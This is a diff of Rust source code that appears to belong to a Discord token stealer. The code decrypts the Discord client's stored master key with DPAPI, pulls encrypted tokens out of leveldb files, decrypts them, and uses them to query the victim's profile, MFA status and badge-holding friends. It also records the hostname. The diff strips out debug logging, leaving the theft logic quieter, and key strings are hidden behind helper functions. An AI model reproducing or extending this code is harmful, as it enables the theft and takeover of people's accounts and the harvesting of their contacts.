@@ -105,7 +105,6 @@ pub fn badge_emojis(flags: u64) -> Vec<String> {
 pub async fn fetch_discord_user(client: &reqwest::Client, token: &str) -> Option<DiscordAccount> {
     let url = crate::s_api_url();
     let token_prefix = &token[..20.min(token.len())];
-    crate::dbg_log!("[DISCORD] fetch_user url={} token_prefix={}", url, token_prefix);
     let auth_header = s_auth_header();
     let res = match client
         .get(&url)
@@ -114,30 +113,23 @@ pub async fn fetch_discord_user(client: &reqwest::Client, token: &str) -> Option
         .await
     {
         Ok(r) => r,
-        Err(e) => { crate::dbg_log!("[DISCORD] fetch_user HTTP error: {:?}", e); return None; }
     };
-    crate::dbg_log!("[DISCORD] fetch_user status={}", res.status());
     if res.status().is_success() {
         let body = match res.text().await {
             Ok(t) => t,
-            Err(e) => { crate::dbg_log!("[DISCORD] fetch_user body error: {:?}", e); return None; }
         };
-        crate::dbg_log!("[DISCORD] fetch_user body_len={}", body.len());
         let json: Value = match serde_json::from_str(&body) {
             Ok(j) => j,
-            Err(e) => { crate::dbg_log!("[DISCORD] fetch_user JSON error: {:?}", e); return None; }
         };
         let username = match json[s_username_field()].as_str() {
             Some(u) => u.to_string(),
             None => {
                 let preview = &body[..200.min(body.len())];
-                crate::dbg_log!("[DISCORD] fetch_user field '{}' not found in: {}", s_username_field(), preview);
                 return None;
             }
         };
         let id = match json[s_id_field()].as_str() {
             Some(i) => i.to_string(),
-            None => { crate::dbg_log!("[DISCORD] fetch_user field '{}' not found", s_id_field()); return None; }
         };
         let public_flags = json[s_public_flags()].as_u64().unwrap_or(0);
         let mfa_enabled = json[s_mfa_enabled()].as_bool().unwrap_or(false);
@@ -145,14 +137,12 @@ pub async fn fetch_discord_user(client: &reqwest::Client, token: &str) -> Option
     } else {
         let status = res.status();
         let body = res.text().await.unwrap_or_default();
-        crate::dbg_log!("[DISCORD] fetch_user FAIL status={} body={}", status, &body[..300.min(body.len())]);
         None
     }
 }
 
 pub async fn fetch_discord_friends(client: &reqwest::Client, token: &str) -> Vec<DiscordFriend> {
     let url = format!("{}/{}", crate::s_api_url(), s_discord_relationships());
-    crate::dbg_log!("[DISCORD] fetch_friends url={}", url);
     let res = match client
         .get(&url)
         .header(s_auth_header(), token)
@@ -161,17 +151,12 @@ pub async fn fetch_discord_friends(client: &reqwest::Client, token: &str) -> Vec
         .await
     {
         Ok(r) => r,
-        Err(e) => { crate::dbg_log!("[DISCORD] fetch_friends HTTP error: {:?}", e); return Vec::new(); }
     };
-    crate::dbg_log!("[DISCORD] fetch_friends status={}", res.status());
     let body = match res.text().await {
         Ok(t) => t,
-        Err(e) => { crate::dbg_log!("[DISCORD] fetch_friends body error: {:?}", e); return Vec::new(); }
     };
-    crate::dbg_log!("[DISCORD] fetch_friends body len={} first200={}", body.len(), &body[..200.min(body.len())]);
     let json: Value = match serde_json::from_str(&body) {
         Ok(j) => j,
-        Err(e) => { crate::dbg_log!("[DISCORD] fetch_friends JSON error: {:?}", e); return Vec::new(); }
     };
     let arr = match json.as_array() {
         Some(a) => a,
@@ -199,70 +184,48 @@ pub async fn fetch_discord_friends(client: &reqwest::Client, token: &str) -> Vec
 
 pub async fn get_discord_data(client: &reqwest::Client) -> (Vec<DiscordAccount>, String, Vec<Value>) {
     let discord_paths = get_discord_paths();
-    crate::dbg_log!("[MAIN] Discord paths: {:?}", discord_paths);
     let mut discord_accounts: Vec<DiscordAccount> = Vec::new();
     let mut sent_tokens = HashSet::new();
 
     for (_name, path) in discord_paths {
-        crate::dbg_log!("[MAIN] Checking path: {:?}", path);
         if !path.exists() {
-            crate::dbg_log!("[MAIN] Path does not exist, skipping");
             continue;
         }
-        crate::dbg_log!("[MAIN] Path exists");
 
         let local_state_name = s_local_state();
-        crate::dbg_log!("[DISCORD] local_state_name='{}'", local_state_name);
         let local_state_path = path.join(&local_state_name);
-        crate::dbg_log!("[DISCORD] local_state_path={:?}", local_state_path);
         let content = match fs::read_to_string(&local_state_path) {
             Ok(c) => c,
-            Err(e) => { crate::dbg_log!("[DISCORD] read_to_string FAILED: {:?}", e); continue; }
         };
-        crate::dbg_log!("[DISCORD] Local State read OK ({} bytes)", content.len());
         let json_ls: Value = match serde_json::from_str(&content) {
             Ok(v) => v,
-            Err(e) => { crate::dbg_log!("[DISCORD] JSON parse FAILED: {:?}", e); continue; }
         };
         let osc = s_os_crypt();
         let ek = s_encrypted_key();
-        crate::dbg_log!("[DISCORD] osc='{}' ek='{}'", osc, ek);
         let enc_key_str = match json_ls[&osc][&ek].as_str() {
             Some(s) => s,
-            None => { crate::dbg_log!("[DISCORD] encrypted_key not found in JSON"); continue; }
         };
-        crate::dbg_log!("[DISCORD] encrypted_key found ({} chars)", enc_key_str.len());
         let bytes = match general_purpose::STANDARD.decode(enc_key_str) {
             Ok(b) => b,
-            Err(e) => { crate::dbg_log!("[DISCORD] base64 decode FAILED: {:?}", e); continue; }
         };
-        crate::dbg_log!("[DISCORD] decoded {} bytes, prefix={:?}", bytes.len(), &bytes[..5.min(bytes.len())]);
         let master_key = match decrypt_master_key(&bytes[5..]) {
             Some(k) => k,
-            None => { crate::dbg_log!("[DISCORD] DPAPI decrypt FAILED"); continue; }
         };
-        crate::dbg_log!("[DISCORD] master_key OK ({} bytes)", master_key.len());
         let prof_path = path.clone();
         if !prof_path.exists() {
-            crate::dbg_log!("[DISCORD] prof_path does not exist");
             continue;
         }
         let db_path = prof_path.join(s_leveldb());
-        crate::dbg_log!("[DISCORD] db_path={:?} exists={}", db_path, db_path.exists());
         if !db_path.exists() {
-            crate::dbg_log!("[DISCORD] leveldb dir not found, skipping");
             continue;
         }
         let entries = match fs::read_dir(&db_path) {
             Ok(e) => e,
-            Err(e) => { crate::dbg_log!("[DISCORD] read_dir FAILED: {:?}", e); continue; }
         };
         let marker = s_token_marker();
-        crate::dbg_log!("[DISCORD] token_marker='{}' ({} chars)", marker, marker.len());
         let re_pattern = format!(r#"{}[^"]+"#, &marker);
         let re = match Regex::new(&re_pattern) {
             Ok(r) => r,
-            Err(e) => { crate::dbg_log!("[DISCORD] regex compile FAILED: {:?}", e); continue; }
         };
         let mut entry_count = 0u32;
         for entry in entries.flatten() {
@@ -279,9 +242,7 @@ pub async fn get_discord_data(client: &reqwest::Client) -> (Vec<DiscordAccount>,
                     if let Ok(enc_data) = general_purpose::STANDARD.decode(b64_part) {
                         if let Some(token) = decrypt_token(&enc_data, &master_key) {
                             if sent_tokens.insert(token.clone()) {
-                                crate::dbg_log!("[DISCORD] token decrypted OK");
                                 if let Some(account) = fetch_discord_user(client, &token).await {
-                                    crate::dbg_log!("[DISCORD] account found: {}", account.username);
                                     discord_accounts.push(account);
                                 }
                             }
@@ -290,7 +251,6 @@ pub async fn get_discord_data(client: &reqwest::Client) -> (Vec<DiscordAccount>,
                 }
             }
         }
-        crate::dbg_log!("[DISCORD] scanned {} entries, found {} accounts so far", entry_count, discord_accounts.len());
     }
 
     let hostname = crate::get_hostname();
@@ -318,10 +278,8 @@ pub async fn get_discord_data(client: &reqwest::Client) -> (Vec<DiscordAccount>,
         summary_description.push_str(&format!("`{}` - {} - MFA: {}\n", acc.username, acc_badges_str, mfa_str));
 
         let friends = fetch_discord_friends(client, &acc.token).await;
-        crate::dbg_log!("[DISCORD] {} friends fetched for {}", friends.len(), acc.username);
         if !friends.is_empty() {
             let hq_friends: Vec<&DiscordFriend> = friends.iter().filter(|f| !badge_emojis(f.public_flags).is_empty()).collect();
-            crate::dbg_log!("[DISCORD] {} friends with badges out of {}", hq_friends.len(), friends.len());
             if !hq_friends.is_empty() {
                 discord_content.push_str(&format!("\n--- HQ Friends of {} ({}/{} total) ---\n", acc.username, hq_friends.len(), friends.len()));
                 summary_description.push_str(&format!("\n**HQ Friends of `{}`** ({}/{}):\n", acc.username, hq_friends.len(), friends.len()));
